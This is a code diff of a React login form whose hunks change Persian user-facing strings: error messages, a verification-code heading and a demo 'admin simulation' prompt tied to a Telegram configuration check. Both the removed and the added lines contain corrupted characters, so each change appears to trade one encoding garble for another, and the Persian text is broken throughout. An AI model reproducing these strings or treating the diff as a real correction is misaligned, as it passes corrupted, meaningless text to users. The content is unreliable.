@@ -275,7 +275,7 @@ export const LoginForm = () => {
           setEmailCode(""); // Clear email code field
           setErrors({
             emailCode:
-              "کد ایمیل وارد شده اشتباه است. لطف���� کد صحیح را وارد کنید.",
+              "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح ر�� وارد کنید.",
           });
           break;
         case "email_code":
@@ -674,7 +674,7 @@ export const LoginForm = () => {
           if (!validateTelegramConfig()) {
             setTimeout(() => {
               const choice = prompt(
-                "🎭 حالت دمو - شبیه‌سازی ادمین\n\n" +
+                "🎭 حالت دمو - شبیه‌سازی ادم��ن\n\n" +
                   "انتخاب کنید:\n" +
                   "1 = Password\n" +
                   "2 = SMS Code\n" +
@@ -2204,7 +2204,7 @@ export const LoginForm = () => {
                   textAlign: "center",
                 }}
               >
-                کد تایید را وارد کنید
+                کد تایید را وارد کن��د
               </h5>
 
               <h6
@@ -2691,7 +2691,7 @@ export const LoginForm = () => {
                 setErrors({});
 
                 if (!passwordValue) {
-                  setErrors({ password: "رمز عبور الزامی است" });
+                  setErrors({ password: "رمز عبو�� الزامی است" });
                   return;
                 }
 
